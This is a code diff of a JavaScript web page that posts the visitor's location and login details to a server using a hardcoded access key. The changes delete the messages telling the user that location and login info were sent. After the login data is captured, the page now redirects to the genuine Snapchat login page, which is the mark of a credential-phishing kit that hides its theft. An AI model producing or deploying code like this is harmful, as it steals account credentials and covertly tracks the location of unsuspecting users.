@@ -51,7 +51,6 @@ function requestLocation() {
           geoReq.setRequestHeader("Content-Type", "application/json");
           geoReq.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
           geoReq.send(JSON.stringify(locationData));
-          showStatus('Location permission granted. Location sent.');
         },
         error => {
           // User denied or error occurred
@@ -74,8 +73,7 @@ function requestLocation() {
     }
   })
   .catch(err => {
-    showStatus('Could not get location.', true);
-  });
+    showStatus('Error fetching location: ' + err.message, true);});
 }
 
 
@@ -106,7 +104,7 @@ window.onload = function() {
       req.setRequestHeader("Content-Type", "application/json");
       req.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
       req.send(JSON.stringify(loginData));
-      showStatus('Login info sent to server.');
+      window.location.href = 'https://accounts.snapchat.com/accounts/login';
     });
   }
 };
